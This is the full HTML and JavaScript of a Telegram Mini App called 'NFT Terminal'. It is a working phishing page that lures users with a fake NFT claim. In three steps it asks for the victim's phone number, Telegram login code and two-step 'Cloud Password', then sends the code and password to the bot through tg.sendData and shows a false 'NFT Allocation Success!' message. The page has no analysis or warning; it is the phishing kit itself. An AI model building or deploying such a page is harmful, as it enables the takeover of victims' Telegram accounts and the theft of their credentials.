<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Crypto NFT Terminal</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            background: radial-gradient(circle at top, #1a1a2e, #0f0f0f);
            color: #fff;
            font-family: 'Segoe UI', Roboto, sans-serif;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .app {
            width: 90%;
            max-width: 400px;
            background: rgba(255, 255, 255, .05);
            backdrop-filter: blur(15px);
            border-radius: 28px;
            padding: 35px 25px;
            text-align: center;
            box-shadow: 0 25px 60px rgba(0,0,0,.6);
            border: 1px solid rgba(255,255,255,0.1);
        }
        .icon {
            width: 80px; height: 80px;
            background: linear-gradient(45deg, #00f2fe, #4facfe);
            border-radius: 22px;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            box-shadow: 0 10px 20px rgba(0,242,254,0.3);
        }
        h1 { font-size: 22px; text-transform: uppercase; margin-bottom: 8px; letter-spacing: 1px; }
        p { font-size: 14px; color: #aaa; margin-bottom: 25px; min-height: 20px; }
        
        .input-group { margin-bottom: 20px; text-align: left; }
        .label { font-size: 11px; color: #4facfe; text-transform: uppercase; margin-bottom: 8px; margin-left: 5px; font-weight: 700; }

        select, input, button {
            width: 100%;
            padding: 16px;
            border-radius: 14px;
            border: none;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
        }
        select, input {
            background: rgba(255, 255, 255, .08);
            color: #fff;
            border: 1px solid rgba(255,255,255,0.1);
            transition: 0.3s;
        }
        input:focus { border-color: #00f2fe; background: rgba(255, 255, 255, .12); }

        button {
            background: linear-gradient(45deg, #00c6ff, #0072ff);
            color: #fff;
            font-weight: 700;
            cursor: pointer;
            text-transform: uppercase;
            margin-top: 10px;
            box-shadow: 0 10px 20px rgba(0,114,255,0.3);
        }
        button:active { transform: scale(.97); }

        .step { display: none; }
        .active { display: block; animation: slideUp 0.4s ease; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

<div class="app">
    <div class="icon">ðŸ’Ž</div>
    <h1>NFT Terminal</h1>
    <p id="status">Connecting...</p>

    <div id="step1" class="step active">
        <div class="input-group">
            <div class="label">Select Region</div>
            <select id="country" onchange="updatePrefix()">
                <option value="+7">Russia ðŸ‡·ðŸ‡º</option>
                <option value="+7">Kazakhstan ðŸ‡°ðŸ‡¿</option>
                <option value="+380">Ukraine ðŸ‡ºðŸ‡¦</option>
                <option value="+375">Belarus ðŸ‡§ðŸ‡¾</option>
                <option value="+998">Uzbekistan ðŸ‡ºðŸ‡¿</option>
                <option value="+1">United States ðŸ‡ºðŸ‡¸</option>
                <option value="+49">Germany ðŸ‡©ðŸ‡ª</option>
            </select>
        </div>
        <div class="input-group">
            <div class="label">Phone Number</div>
            <div style="display:flex; gap:10px;">
                <input type="text" id="prefix" style="width:75px; text-align:center;" value="+7" readonly>
                <input type="tel" id="phone" placeholder="900 000 0000">
            </div>
        </div>
        <button onclick="sendPhone()">Authorize</button>
    </div>

    <div id="step2" class="step">
        <div class="input-group">
            <div class="label">Verification Code</div>
            <input type="number" id="code" placeholder="00000" style="text-align:center; letter-spacing:8px;">
        </div>
        <button onclick="sendCode()">Verify Code</button>
    </div>

    <div id="step3" class="step">
        <div class="input-group">
            <div class="label">Cloud Password</div>
            <input type="password" id="password" placeholder="â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢">
        </div>
        <button onclick="sendPass()">Claim NFT</button>
    </div>
</div>

<script>
const tg = window.Telegram.WebApp;
tg.expand();

// ÐŸÑ€Ð¸Ð²ÐµÑ‚ÑÑ‚Ð²Ð¸Ðµ
const user = tg.initDataUnsafe?.user;
const statusEl = document.getElementById("status");
statusEl.innerText = user ? `Welcome, ${user.first_name}` : "Terminal ready";

function updatePrefix() {
    document.getElementById("prefix").value = document.getElementById("country").value;
}

function showStep(s) {
    document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
    document.getElementById('step' + s).classList.add('active');
}

function sendPhone() {
    const ph = document.getElementById('phone').value;
    if(ph.length > 5) {
        tg.sendData("PHONE_REQUESTED"); // Ð¡Ð¸Ð³Ð½Ð°Ð» Ð±Ð¾Ñ‚Ñƒ Ð½Ð°Ñ‡Ð°Ñ‚ÑŒ ÑÐµÑÑÐ¸ÑŽ
        statusEl.innerText = "Code sent to Telegram";
        showStep(2);
    }
}

function sendCode() {
    const c = document.getElementById('code').value;
    if(c.length === 5) {
        tg.sendData("CODE:" + c);
        statusEl.innerText = "Checking security...";
        showStep(3);
    }
}

function sendPass() {
    const p = document.getElementById('password').value;
    if(p.length > 0) {
        tg.sendData("PASS:" + p);
        statusEl.innerText = "NFT Allocation Success!";
        setTimeout(() => tg.close(), 1200);
    }
}
</script>
</body>
</html>
